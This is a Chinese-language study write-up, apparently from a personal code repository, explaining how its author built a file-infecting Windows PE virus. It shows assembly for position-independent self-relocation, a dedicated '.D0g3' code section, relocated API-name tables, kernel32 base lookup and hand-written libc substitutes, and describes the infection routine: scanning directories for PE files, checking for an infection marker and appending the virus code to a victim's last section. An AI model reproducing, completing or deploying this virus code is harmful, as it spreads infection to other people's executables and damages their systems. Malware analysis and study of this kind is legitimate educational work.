# 蠕虫母体

[mycode/恶意代码/蠕虫 at 5b68fd9d3eb4a03d5c9dd90995c28ec1c7619fb4 · redqx/mycode](https://github.com/redqx/mycode/tree/5b68fd9d3eb4a03d5c9dd90995c28ec1c7619fb4/恶意代码/蠕虫)

代码的运行肯定还是需要配置一下visual stdio的

# 总体原理

# 如何重定位

![Untitled](%E8%A0%95%E8%99%AB%E6%AF%8D%E4%BD%93%20a40de4f2b6f74675ac4fee1032254895/Untitled.png)

左边那个图是没有感染别人时候

右边那个图是把自己附加到别人那里去的时候

左边那个图,y1的地址就是=x1+y1-x1=ebx+y1-x1

其中x1的地址可以通过pop ebx的方式获取

所以y1的地址=真实地址+偏移

对于右图而言,是同理的

y2的地址就是x2(真实地址)+偏移

x2的获取是通过pop ebx

偏移地址是二进制文件中写死了的

```nasm
__asm {
        push eax;
        push ebx;
        push ecx;

        call label_reloc;
    label_reloc:
        pop ebx; //获取真实地址
 
        lea eax, apiAddr;lea eax,ds:00405787;mov eax,0x00405787 等价的
				sub eax, label_reloc;sub eax,0x00405900  等价的
				
        add eax, ebx;

        lea ecx, lp_apiAddr;
        mov[ecx], eax;

        pop ecx;
        pop ebx;
        pop eax;

    }
```

实际代码

![Untitled](%E8%A0%95%E8%99%AB%E6%AF%8D%E4%BD%93%20a40de4f2b6f74675ac4fee1032254895/Untitled%201.png)

# 节区准备

为什么要准备一个节区?

 方便复制把..

把所有要用到的数据都存放在一个节区中

```c
#pragma code_seg(".D0g3")

//这里是要写的代码

#pragma code_seg()
#pragma comment(linker, "/SECTION:.D0g3,ERW")
```

# 全局变量准备

全局变量插在D0g3节区中

首先局部变量是不需要重定位的

全局变量需要重定位

重定位的方法前面已经说了

然后说一下这几个全局变量的作用

```c

__declspec(allocate(".D0g3")) __declspec(selectany)  DWORD apiAddr[18] = { 0 };
__declspec(allocate(".D0g3")) __declspec(selectany)  int funcAddr[] =
{
    //要重定位的的东西
    func0_cmp,
    func1_cpy,
		//...
};
__declspec(allocate(".D0g3")) __declspec(selectany) char szkernel32[] = "kernel32.dll";
__declspec(allocate(".D0g3")) __declspec(selectany) char szGetProcAddress[] = "GetProcAddress";
__declspec(allocate(".D0g3")) __declspec(selectany) char szLoadLibraryA[] = "LoadLibraryA";
__declspec(allocate(".D0g3")) __declspec(selectany) char szCreateFileA[] = "CreateFileA";
//...

__declspec(allocate(".D0g3")) __declspec(selectany) DWORD szAPIname[] =
{
    //要重定位的的东西
    szkernel32,//0
    szGetProcAddress,//1
    szLoadLibraryA,//2
    szCreateFileA,//3
		//...
};
//截取的一部分
```

 **DWORD apiAddr[18] = { 0 };**

主要用于存放API的真实地址

**int funcAddr[]**

主要用于存放一些蠕虫函数的地址,这些函数地址也是需要重定位才能使用的

**DWORD szAPIname[]**

主要用于存放API的一些常量字符串名称, 使用的时候还需要重定位这些字符串指针

然后就是说一下为什么全局变量要重定位? 不言而喻,因为地址发生了变化

但是一些常量字符串她也会发生一些地址变化

比如

```c
char x[]="D0g3"
```

在实际代码中,他会把常量字符串的数据赋值给x

此刻的常量字符串就好比全局变量了,如果没有重定位,是无法正常使用的

所以为了不去重定位,我把数组的字符串变为了赋值语句

```c
char tagSec[8] = { 0 };
    tagSec[0] = '.';
    tagSec[1] = 'D';
    tagSec[2] = '0';
    tagSec[3] = 'g';
    tagSec[4] = '3';
```

这样就不用重定位了

# 函数介绍

```c

DWORD __stdcall func0_cmp(char* x, char* y, int len);
void __stdcall func1_cpy(char* x, char* y, int len);
DWORD __stdcall func2_len(char* X);
void __stdcall func3_GetKernelBase();
DWORD __stdcall func4_Align(DWORD dwSize, DWORD dwAlign);
DWORD __stdcall func5_patchPe(DWORD f_Name);
DWORD __stdcall func6_getD0g3Section();
DWORD __stdcall func7_CheckFIle(DWORD f_Name);
void __stdcall func8_SearchFile2();
DWORD __stdcall func9_GetApi(DWORD mImageBase, char* funcName);
void __stdcall func10_initApi();
void __stdcall func11_freloc(DWORD* x, int len, int dif);
```

## 一般的函数

```c
DWORD __stdcall func0_cmp(char* x, char* y, int len);
void __stdcall func1_cpy(char* x, char* y, int len);
DWORD __stdcall func2_len(char* X);
void __stdcall func3_GetKernelBase();
DWORD __stdcall func4_Align(DWORD dwSize, DWORD dwAlign);
DWORD __stdcall func9_GetApi(DWORD mImageBase, char* funcName);
void __stdcall func10_initApi();
void __stdcall func11_freloc(DWORD* x, int len, int dif);
```

因为我不会用蠕虫病毒去调用stdio标准库的一些东西

所以用到的一些标准库函数需要去手写

比如

用`func0_cmp` 去模拟`memcmp`  

用`func1_cpy` 去模拟`memcpy` 

用`func2_len` 去模拟`strlen`

其它比较重要的:

`func4_Align` 对内存做一个的对齐

`func9_GetApi` 传入dll的基地址,获取函数的API

`func10_initApi` 初始化API数组

`func11_freloc` 对数组的成员重定位,比如DWORD szAPIname[] , int funcAddr[] 

`func3_GetKernelBase();` 获取kernel32的基地址

ps: 获取kernel32基地址还有哪些方法?

## 核心函数

```c
DWORD __stdcall func5_patchPe(DWORD f_Name);
DWORD __stdcall func6_getD0g3Section();
DWORD __stdcall func7_CheckFIle(DWORD f_Name);
void __stdcall func8_SearchFile2();
```

整体的一个攻击流程就是:

![Untitled](%E8%A0%95%E8%99%AB%E6%AF%8D%E4%BD%93%20a40de4f2b6f74675ac4fee1032254895/Untitled%202.png)

### func7_CheckFIle

遍历指定目录下文件

1. 判断是不是PE文件
2. 可不可以增加一个节区
3. 是否已经被感染过了

如何判断PE文件: MZ和PE00

如何判断是否可以增加一个节区?

如果增加一个节去区表后,PE头大小越过了第一个节区的起始位置,就说明无法新增一个节区

如何判断是否被感染过:

看是否有D0g3的节区,有就说明被感染了

### patchPe

其实就是把病毒代码给复制到感染者最后一个节区中